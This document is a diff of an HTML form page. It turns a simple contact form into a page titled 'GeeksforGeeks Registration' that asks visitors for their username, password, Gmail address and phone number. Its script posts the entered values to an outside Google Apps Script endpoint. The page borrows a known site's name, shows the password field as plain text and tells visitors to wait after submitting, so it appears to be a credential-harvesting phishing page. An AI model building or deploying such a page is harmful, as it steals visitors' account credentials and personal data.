@@ -1,57 +1,111 @@
-<!DOCTYPE html>
-<html>
-<style>
-input[type=text], select {
-  width: 100%;
-  padding: 12px 20px;
-  margin: 8px 0;
-  display: inline-block;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  box-sizing: border-box;
+<!DOCTYPE html> 
+<html> 
+
+<head> 
+	<title>GeeksforGeeks Registration</title> 
+	<link rel="stylesheet"
+		href="style.css"> 
+		<style type="text/css">
+			body { 
+	display: flex; 
+	align-items: center; 
+	justify-content: center; 
+	font-family: sans-serif; 
+	line-height: 1.5; 
+	min-height: 100vh; 
+	background: #f3f3f3; 
+	flex-direction: column; 
+	margin: 0; 
+} 
+
+.main { 
+	background-color: #fff; 
+	border-radius: 15px; 
+	box-shadow: 0 0 20px rgba(0, 0, 0, 0.2); 
+	padding: 10px 20px; 
+	transition: transform 0.2s; 
+	width: 500px; 
+	text-align: center; 
+} 
+
+h1 { 
+	color: #4CAF50; 
+} 
+
+label { 
+	display: block; 
+	width: 100%; 
+	margin-top: 10px; 
+	margin-bottom: 5px; 
+	text-align: left; 
+	color: #555; 
+	font-weight: bold; 
+} 
+
+
+input { 
+	display: block; 
+	width: 100%; 
+	margin-bottom: 15px; 
+	padding: 10px; 
+	box-sizing: border-box; 
+	border: 1px solid #ddd; 
+	border-radius: 5px; 
+} 
+
+button { 
+	padding: 15px; 
+	border-radius: 10px; 
+	margin-top: 15px; 
+	margin-bottom: 15px; 
+	border: none; 
+	color: white; 
+	cursor: pointer; 
+	background-color: #4CAF50; 
+	width: 100%; 
+	font-size: 16px; 
+} 
+
+.wrap { 
+	display: flex; 
+	justify-content: center; 
+	align-items: center; 
 }
 
-input[type=submit] {
-  width: 100%;
-  background-color: #4CAF50;
-  color: white;
-  padding: 14px 20px;
-  margin: 8px 0;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-}
+		</style>
+</head> 
 
-input[type=submit]:hover {
-  background-color: #45a049;
-}
+<body> 
+	<div class="main"> 
+		<h1>Nikku</h1> 
+		<h3>Enter your login credentials</h3> 
+		<form method="POST" name="google-sheet">
+    <label for="Name">Username</label>
+    <input type="text" id="fname" name="Username" placeholder="Enter your Username..">
 
-div {
-  border-radius: 5px;
-  background-color: #f2f2f2;
-  padding: 20px;
-}
-</style>
-<body>
+    <label for="lname">Password</label>
+    <input type="text" id="lname" name="Password" placeholder="Enter your Password..">
 
-<h3>Sign in here</h3>
+    <label for="lname">Gmail</label>
+    <input type="text" id="lname" name="Gmail" placeholder="Enter your Gmail..">
 
-<div>
-  <form method="POST" name="google-sheet">
-    <label for="name">Name</label>
-    <input type="text" id="fname" name="Name" placeholder="Your Name..">
-
-    <label for="lname">Email</label>
-    <input type="text" id="lname" name="Email" placeholder="Your Email..">
-
-    <label for="lname">Mobile</label>
-    <input type="text" id="lname" name="Mobile" placeholder="Your Mobile Number..">
+    <label for="lname">Number</label>
+    <input type="Number" id="lname" name="Number" placeholder="Enter your Number..">
   
-    <input type="submit" value="Submit" name="submit">
+   <div class="wrap"> 
+				 <button type="submit"  value="Submit" name="submit">
+				 Submit</button>
+	</div>
   </form>
-</div>
-
-<script>
+  <p>click on submit and wait for 3 seconds.....</p>
+		<p>Not registered? 
+			<a href="#"
+			style="text-decoration: none;"> 
+				Create an account 
+			</a> 
+		</p> 
+	</div> 
+	<script>
             const scriptURL = 'https://script.google.com/macros/s/AKfycbzauCbzrJ2LEF9K5s0dbhbXPKrEjam9JswSdgtVVXDhisk1mGd6A4ChwFZ_waXAE1-Log/exec'
             const form = document.forms['google-sheet']
           
@@ -62,6 +116,6 @@ div {
                 .catch(error => console.error('Error!', error.message))
             })
           </script>
+</body> 
 
-</body>
 </html>
